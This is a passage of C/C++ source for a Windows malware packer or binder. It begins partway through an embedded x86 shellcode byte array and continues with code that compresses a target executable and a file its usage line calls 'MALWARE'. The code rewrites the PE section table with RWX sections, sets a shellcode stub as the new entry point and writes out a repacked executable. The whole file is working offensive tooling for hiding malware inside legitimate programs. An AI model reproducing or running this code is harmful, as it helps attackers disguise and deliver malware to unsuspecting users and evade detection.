0x6D, 0x70, 0x50, 0xC7, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x61, 0x74, 0x68, 0x41, 0xC6, 0x84, 0x24, 0x9C, 0x00, 0x00, 0x00, 0x00, 0xE8, 0xC6, 0xF8, 0xFF, 0xFF, 0x89, 0xC5, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 0x8D, 0x78, 0x14, 0x39, 0xF7, 0x75, 0x08, 0xEB, 0x1C, 0x8B, 0x36, 0x39, 0xF7, 0x74, 0x16, 0x8B, 0x4E, 0x10, 0x89, 0xEA, 0xE8, 0x12, 0xF9, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEC, 0x89, 0xC6, 0xEB, 0x06, 0x8D, 0x74, 0x26, 0x00, 0x31, 0xF6, 0xE8, 0x41, 0xFC, 0xFF, 0xFF, 0x8D, 0x8C, 0x24, 0x14, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x8D, 0x90, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0xE6, 0xF6, 0xFF, 0xFF, 0x83, 0xEC, 0x04, 0xE8, 0x20, 0xFC, 0xFF, 0xFF, 0xC7, 0x04, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x05, 0xB0, 0x01, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0xFF, 0xD6, 0x83, 0xEC, 0x08, 0xE8, 0x06, 0xFC, 0xFF, 0xFF, 0x8D, 0x94, 0x24, 0x14, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x8D, 0x88, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x9D, 0xF7, 0xFF, 0xFF, 0x83, 0xEC, 0x04, 0xE8, 0xE5, 0xFB, 0xFF, 0xFF, 0x8D, 0x8C, 0x24, 0x14, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x8D, 0x90, 0x84, 0x00, 0x00, 0x00, 0xE8, 0x8A, 0xF6, 0xFF, 0xFF, 0x83, 0xEC, 0x04, 0xE8, 0xC4, 0xFB, 0xFF, 0xFF, 0xC7, 0x04, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x05, 0x84, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0xFF, 0xD6, 0x83, 0xEC, 0x08, 0xE8, 0xAA, 0xFB, 0xFF, 0xFF, 0x8D, 0x94, 0x24, 0x14, 0x01, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x2C, 0x01, 0x00, 0x00, 0x8D, 0x88, 0x84, 0x00, 0x00, 0x00, 0xE8, 0x41, 0xF7, 0xFF, 0xFF, 0x83, 0xEC, 0x04, 0x8B, 0x4C, 0x24, 0x44, 0x8D, 0x7C, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x58, 0x00, 0x00, 0x00, 0x00, 0x64, 0x8B, 0x15, 0x30, 0x00, 0x00, 0x00, 0x89, 0x7C, 0x24, 0x14, 0x8B, 0x41, 0x08, 0x89, 0x44, 0x24, 0x10, 0x8B, 0x41, 0x0C, 0x03, 0x42, 0x08, 0x89, 0x44, 0x24, 0x0C, 0x8B, 0x43, 0x08, 0x89, 0x44, 0x24, 0x08, 0x8B, 0x43, 0x0C, 0x03, 0x42, 0x08, 0xC7, 0x04, 0x24, 0x02, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x44, 0x24, 0x34, 0xFF, 0xD0, 0x83, 0xEC, 0x18, 0xE8, 0x3C, 0xFB, 0xFF, 0xFF, 0x8B, 0x90, 0x80, 0x00, 0x00, 0x00, 0x05, 0xB0, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10, 0x04, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x89, 0x54, 0x24, 0x44, 0x8B, 0x54, 0x24, 0x38, 0xC7, 0x44, 0x24, 0x08, 0x02, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x10, 0x89, 0x04, 0x24, 0xFF, 0xD2, 0x83, 0xEC, 0x1C, 0x89, 0xC5, 0x8B, 0x54, 0x24, 0x44, 0x8D, 0x74, 0x24, 0x5C, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x89, 0x74, 0x24, 0x0C, 0x8B, 0x4C, 0x24, 0x3C, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0x89, 0x54, 0x24, 0x08, 0x8B, 0x53, 0x0C, 0x03, 0x50, 0x08, 0x89, 0x2C, 0x24, 0x89, 0x54, 0x24, 0x04, 0xFF, 0xD1, 0x83, 0xEC, 0x14, 0x89, 0x2C, 0x24, 0x8B, 0x6C, 0x24, 0x40, 0xFF, 0xD5, 0x83, 0xEC, 0x04, 0x64, 0x8B, 0x15, 0x30, 0x00, 0x00, 0x00, 0x89, 0x7C, 0x24, 0x14, 0x8B, 0x7C, 0x24, 0x48, 0x8B, 0x47, 0x08, 0x89, 0x44, 0x24, 0x10, 0x8B, 0x47, 0x0C, 0x03, 0x42, 0x08, 0x89, 0x44, 0x24, 0x0C, 0x8B, 0x43, 0x08, 0x89, 0x44, 0x24, 0x08, 0x8B, 0x43, 0x0C, 0x03, 0x42, 0x08, 0xC7, 0x04, 0x24, 0x02, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x44, 0x24, 0x34, 0xFF, 0xD0, 0x83, 0xEC, 0x18, 0xE8, 0x69, 0xFA, 0xFF, 0xFF, 0x8B, 0x54, 0x24, 0x38, 0x8B, 0x68, 0x7C, 0x05, 0x84, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10, 0x04, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x02, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x10, 0x89, 0x04, 0x24, 0xFF, 0xD2, 0x83, 0xEC, 0x1C, 0x89, 0xC7, 0x64, 0x8B, 0x15, 0x30, 0x00, 0x00, 0x00, 0x89, 0x74, 0x24, 0x0C, 0x8B, 0x4C, 0x24, 0x3C, 0x89, 0x6C, 0x24, 0x08, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x43, 0x0C, 0x03, 0x42, 0x08, 0x89, 0x3C, 0x24, 0x89, 0x44, 0x24, 0x04, 0xFF, 0xD1, 0x83, 0xEC, 0x14, 0x89, 0x3C, 0x24, 0x8B, 0x6C, 0x24, 0x40, 0xFF, 0xD5, 0x31, 0xD2, 0x83, 0xEC, 0x04, 0x8D, 0x9C, 0x24, 0xD0, 0x00, 0x00, 0x00, 0xC7, 0x04, 0x24, 0x44, 0x00, 0x00, 0x00, 0x89, 0xD9, 0xE8, 0xDC, 0xF5, 0xFF, 0xFF, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x83, 0xEC, 0x04, 0x66, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0x8D, 0xB4, 0x24, 0xAC, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xFC, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xE8, 0xA1, 0xF9, 0xFF, 0xFF, 0x8B, 0x7C, 0x24, 0x4C, 0x89, 0x74, 0x24, 0x24, 0x05, 0xB0, 0x01, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x1C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x89, 0xD9, 0x31, 0xD2, 0x83, 0xEC, 0x28, 0xC7, 0x04, 0x24, 0x44, 0x00, 0x00, 0x00, 0xE8, 0x49, 0xF5, 0xFF, 0xFF, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x83, 0xEC, 0x04, 0xC7, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xFC, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x66, 0x89, 0x94, 0x24, 0x00, 0x01, 0x00, 0x00, 0xE8, 0x15, 0xF9, 0xFF, 0xFF, 0x89, 0x74, 0x24, 0x24, 0x05, 0x84, 0x00, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x20, 0xC7, 0x44, 0x24, 0x1C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x18, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x10, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x0C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x83, 0xEC, 0x28, 0x81, 0xC4, 0x4C, 0x02, 0x00, 0x00, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90 };
unsigned int x86_shellcode_size = 3216;

DWORD largeFileSize = 0;

bool readBinFile(const char fileName[], char** bufPtr, DWORD& length) {
	FILE* fp;
	fopen_s(&fp, fileName, "rb");
	if (fp) {
		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		*bufPtr = new char[length + 1];
		fseek(fp, 0, SEEK_SET);
		fread(*bufPtr, sizeof(char), length, fp);
		return true;
	}
	else return false;
}

#define getNtHdr(buf) ((IMAGE_NT_HEADERS*)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew ))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
unsigned int getExeSizeByLastestSection(char* buf) {
	IMAGE_NT_HEADERS* ntHdr = getNtHdr(buf);
	IMAGE_SECTION_HEADER* sectionHdr = getSectionArr(buf);
	unsigned int currInputExeSize(
		sectionHdr[ntHdr->FileHeader.NumberOfSections - 1].PointerToRawData + \
		sectionHdr[ntHdr->FileHeader.NumberOfSections - 1].SizeOfRawData
	);
	return currInputExeSize;
}

typedef NTSTATUS(WINAPI* XRtlCompressBuffer)(USHORT CompressionFormatAndEngine, PUCHAR UncompressedBuffer, ULONG  UncompressedBufferSize, PUCHAR CompressedBuffer,
	ULONG  CompressedBufferSize, ULONG  UncompressedChunkSize, PULONG FinalCompressedSize, PVOID  WorkSpace);
typedef NTSTATUS(WINAPI* XRtlGetCompressionWorkSpaceSize)(USHORT CompressionFormatAndEngine, PULONG CompressBufferWorkSpaceSize, PULONG CompressFragmentWorkSpaceSize);

#define P2ALIGNUP(size, align) ( (((size) / (align)) + 1) * (align)  )

LPVOID compressData(LPVOID img, size_t imgSize, DWORD& outSize) {
	DWORD(WINAPI * fnRtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG)
		= (DWORD(WINAPI*)(USHORT, PULONG, PULONG))
		(::GetProcAddress(::GetModuleHandle(TEXT("ntdll.dll")), "RtlGetCompressionWorkSpaceSize"));

	DWORD(WINAPI * fnRtlCompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID)
		= (DWORD(WINAPI*)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID))
		(::GetProcAddress(::GetModuleHandle(TEXT("ntdll.dll")), "RtlCompressBuffer"));

	ULONG uCompressBufferWorkSpaceSize, uCompressFragmentWorkSpaceSize;
	if (fnRtlGetCompressionWorkSpaceSize(
		COMPRESSION_FORMAT_LZNT1,
		&uCompressBufferWorkSpaceSize,
		&uCompressFragmentWorkSpaceSize)) {
		return 0;
	}

	PUCHAR pWorkSpace = new UCHAR[uCompressBufferWorkSpaceSize];
	UCHAR* out = new UCHAR[imgSize];
	memset(out, 0, imgSize);
	if (fnRtlCompressBuffer(
		COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM,
		(PUCHAR)img,
		imgSize,
		out,
		imgSize,
		4096,
		&outSize,
		pWorkSpace))
		return 0;
	else
		return out;
}

bool dumpMappedImgBin(char* buf, BYTE*& mappedImg, size_t* imgSize) {
	PIMAGE_SECTION_HEADER stectionArr = getSectionArr(buf);
	*imgSize = getNtHdr(buf)->OptionalHeader.SizeOfImage - stectionArr[0].VirtualAddress; // start with the first section data.
	mappedImg = new BYTE[*imgSize];
	memset(mappedImg, 0, *imgSize);

	for (size_t i = 0; i < getNtHdr(buf)->FileHeader.NumberOfSections; i++)
		memcpy(mappedImg + stectionArr[i].VirtualAddress - stectionArr[0].VirtualAddress, buf + stectionArr[i].PointerToRawData, stectionArr[i].SizeOfRawData);
	return true;
}

struct packingRecord {
	IMAGE_DATA_DIRECTORY prevDataDirTable[15];
	DWORD orginalEntryPoint;
	DWORD MalwareDataSize;
	DWORD ExeDataSize;
	char MalFileName[300];
	char ExeFileName[300];
};

packingRecord packingRecord_struct;

void linkCompressBin(char* buf, BYTE* stub, size_t stubSize, BYTE* compressedImgData, size_t compressedDataSize, BYTE* malwareData, size_t malwareDataSize) {
	WORD sizeOfOptionalHeader = getNtHdr(buf)->FileHeader.SizeOfOptionalHeader;
	DWORD sectionAlignment = getNtHdr(buf)->OptionalHeader.SectionAlignment;
	DWORD fileAlignment = getNtHdr(buf)->OptionalHeader.FileAlignment;

	// deal with the first section
	PIMAGE_SECTION_HEADER sectionArr = getSectionArr(buf);
	//packingRecord* currPackingRecord = new packingRecord();
	packingRecord* currPackingRecord = &packingRecord_struct;
	memcpy(&(currPackingRecord->prevDataDirTable), &(getNtHdr(buf)->OptionalHeader.DataDirectory), sizeof(IMAGE_DATA_DIRECTORY) * 15);
	currPackingRecord->orginalEntryPoint = getNtHdr(buf)->OptionalHeader.AddressOfEntryPoint;
	memset(getNtHdr(buf)->OptionalHeader.DataDirectory, 0, sizeof(IMAGE_DATA_DIRECTORY) * 15);

	// -------------------------------- Mapping RWX memory section --------
	memcpy(&(sectionArr[0].Name), ".mem", 8); 
	//sectionArr[0].Misc.VirtualSize = (getNtHdr(buf)->OptionalHeader.SizeOfImage - getNtHdr(buf)->OptionalHeader.SizeOfHeaders) * 5;
	sectionArr[0].Misc.VirtualSize = largeFileSize*2;
	sectionArr[0].VirtualAddress = 0x1000;
	sectionArr[0].SizeOfRawData = 0;
	sectionArr[0].PointerToRawData = 0;
	sectionArr[0].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

	//---------------------------------- Stub -----------------------------
	memcpy(&(sectionArr[1].Name), ".text", 8);
	sectionArr[1].Misc.VirtualSize = stubSize;
	sectionArr[1].VirtualAddress = P2ALIGNUP((sectionArr[0].VirtualAddress + sectionArr[0].Misc.VirtualSize), sectionAlignment);
	sectionArr[1].SizeOfRawData = P2ALIGNUP(stubSize, fileAlignment);
	sectionArr[1].PointerToRawData = getNtHdr(buf)->OptionalHeader.SizeOfHeaders;
	sectionArr[1].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	memcpy((PVOID)((UINT_PTR)buf + sectionArr[1].PointerToRawData), stub, stubSize);
	getNtHdr(buf)->OptionalHeader.AddressOfEntryPoint = sectionArr[1].VirtualAddress;

	//---------------------------------- Compressed Data Section ----------
	memcpy(&(sectionArr[2].Name), ".data1", 8);
	sectionArr[2].Misc.VirtualSize = compressedDataSize;
	sectionArr[2].VirtualAddress = P2ALIGNUP(sectionArr[1].VirtualAddress + sectionArr[1].Misc.VirtualSize, sectionAlignment);
	sectionArr[2].SizeOfRawData = P2ALIGNUP(compressedDataSize, fileAlignment);
	sectionArr[2].PointerToRawData = sectionArr[1].PointerToRawData + sectionArr[1].SizeOfRawData;
	sectionArr[2].Characteristics = IMAGE_SCN_MEM_READ;
	memcpy((PVOID)((UINT_PTR)buf + sectionArr[2].PointerToRawData), compressedImgData, compressedDataSize);

	//---------------------------------- Packing Record -----------------------------
	memcpy(&(sectionArr[3].Name), ".data", 8);
	sectionArr[3].Misc.VirtualSize = sizeof(packingRecord);
	sectionArr[3].VirtualAddress = P2ALIGNUP(sectionArr[2].VirtualAddress + sectionArr[2].Misc.VirtualSize, sectionAlignment);
	sectionArr[3].SizeOfRawData = P2ALIGNUP(sizeof(packingRecord), fileAlignment);
	sectionArr[3].PointerToRawData = sectionArr[2].PointerToRawData + sectionArr[2].SizeOfRawData;
	sectionArr[3].Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	memcpy((PVOID)((UINT_PTR)buf + sectionArr[3].PointerToRawData), currPackingRecord, sizeof(packingRecord));

	//---------------------------------- Malware Data Section -----------------------------

	//memcpy(&(sectionArr[4].Name), "rel\x00", 8);
	memcpy(&(sectionArr[4].Name), ".data2", 8);
	sectionArr[4].Misc.VirtualSize = malwareDataSize;
	sectionArr[4].VirtualAddress = P2ALIGNUP(sectionArr[3].VirtualAddress + sectionArr[3].Misc.VirtualSize, sectionAlignment);
	sectionArr[4].SizeOfRawData = P2ALIGNUP(malwareDataSize, fileAlignment);
	sectionArr[4].PointerToRawData = sectionArr[3].PointerToRawData + sectionArr[3].SizeOfRawData;
	sectionArr[4].Characteristics = IMAGE_SCN_MEM_READ;
	memcpy((PVOID)((UINT_PTR)buf + sectionArr[4].PointerToRawData), malwareData, malwareDataSize);
	/**/
	//------------------------- Fix SizeOfImage for Application Loader -------------------------
	getNtHdr(buf)->OptionalHeader.DllCharacteristics &= ~(IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE);
	getNtHdr(buf)->FileHeader.NumberOfSections = 5;
	getNtHdr(buf)->OptionalHeader.SizeOfImage = \
		sectionArr[getNtHdr(buf)->FileHeader.NumberOfSections - 1].VirtualAddress + \
		sectionArr[getNtHdr(buf)->FileHeader.NumberOfSections - 1].SizeOfRawData;
}

int main(int argc, char** argv)
{
	if (argc != 4) {
		printf("[!] usage: %s [TARGET_PE_FILE] [MALWARE] [Arch]", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
		return 0;
	}

	char* in_peFilePath = argv[1];
	char* outputFileName = new char[strlen(in_peFilePath) + 0xff];

	sprintf_s(packingRecord_struct.ExeFileName, "%s", argv[1]);
	sprintf_s(packingRecord_struct.MalFileName, "%s", argv[2]);
	
	char arch[10];
	memset(arch, 0, 10);
	strncpy_s(arch, argv[3], 10);
	if (strncmp(arch, "x64", 3) == 0);
	else if (strncmp(arch, "x86", 3) == 0);
	else {
		printf("Arch : x86 / x64\n");
		return 0;
	}

	strcpy_s(outputFileName, 300, in_peFilePath);
	// ------------------ Target PE File -------------------------------------
	printf("[+] detect input PE file: %s\n", in_peFilePath);
	char* peBuf; DWORD pe_filesize;
	if (!readBinFile(in_peFilePath, &peBuf, pe_filesize)) {
		puts("\t-> fail to read input PE binary.");
		return 0;
	}
	else puts("\t-> read PE file... done.");

	packingRecord_struct.ExeDataSize = pe_filesize;
	largeFileSize = pe_filesize;

	printf("[+] dump dynamic image.\n");
	DWORD PEzipedSize = -1;
	BYTE* pe_compressImg = (BYTE*)compressData(peBuf, pe_filesize, PEzipedSize);
	if (pe_compressImg)
		puts("\t-> compressing image... done.");
	else
		puts("\t-> fail to do compress.");
	// ------------------ Malware PE File ------------------------------------
	in_peFilePath = argv[2];
	printf("[+] detect input Malware file: %s\n", in_peFilePath);
	char* malwareBuf; DWORD malware_filesize;
	if (!readBinFile(in_peFilePath, &malwareBuf, malware_filesize)) {
		puts("\t-> fail to read input PE binary.");
		return 0;
	}
	else puts("\t-> read PE file... done.");

	packingRecord_struct.MalwareDataSize = malware_filesize;
	if (malware_filesize > largeFileSize) {
		largeFileSize = malware_filesize;
	}

	printf("[+] dump dynamic image.\n");
	DWORD MALWAREzipedSize = -1;
	BYTE* malware_compressImg = (BYTE*)compressData(malwareBuf, malware_filesize, MALWAREzipedSize);
	if (malware_compressImg)
		puts("\t-> compressing image... done.");
	else
		puts("\t-> fail to do compress.");
	// --------------------------------------------------------------------
	printf("[+] linking & repack whole PE file. \n");
	size_t newSectionSize;
	char* newOutBuf;
	if (strncmp(arch, "x64", 3) == 0) {
		newSectionSize = P2ALIGNUP(sizeof(x64_shellcode), getNtHdr(peBuf)->OptionalHeader.FileAlignment);
		newOutBuf = new char[pe_filesize + malware_filesize + newSectionSize];
		memset(newOutBuf, 0, pe_filesize + malware_filesize + newSectionSize);
		memcpy(newOutBuf, peBuf, pe_filesize);
		linkCompressBin(newOutBuf, x64_shellcode, x64_shellcode_size, pe_compressImg, PEzipedSize, malware_compressImg, MALWAREzipedSize);
		strcpy_s(strrchr(outputFileName, '.'), 300, "_x64.exe\x00");
	}
	else if (strncmp(arch, "x86", 3) == 0) {
		newSectionSize = P2ALIGNUP(sizeof(x86_shellcode), getNtHdr(peBuf)->OptionalHeader.FileAlignment);
		newOutBuf = new char[pe_filesize + malware_filesize + newSectionSize];
		memset(newOutBuf, 0, pe_filesize + malware_filesize + newSectionSize);
		memcpy(newOutBuf, peBuf, pe_filesize);
		linkCompressBin(newOutBuf, x86_shellcode, x86_shellcode_size, pe_compressImg, PEzipedSize, malware_compressImg, MALWAREzipedSize);
		strcpy_s(strrchr(outputFileName, '.'), 300, "_x86.exe\x00");
	}
	else {
		printf("Arch Error!\n");
		return 0;
	}

	size_t finallySize = getSectionArr(newOutBuf)[getNtHdr(newOutBuf)->FileHeader.NumberOfSections - 1].PointerToRawData + \
		getSectionArr(newOutBuf)[getNtHdr(newOutBuf)->FileHeader.NumberOfSections - 1].SizeOfRawData;

	printf("[+] generating finally packed PE file.\n");
	FILE *file;
	fopen_s(&file, outputFileName, "wb");
	fwrite(newOutBuf, sizeof(char), finallySize, file);
	printf("[+] output PE file saved as %s\n", outputFileName);
	puts("[+] done.");

}

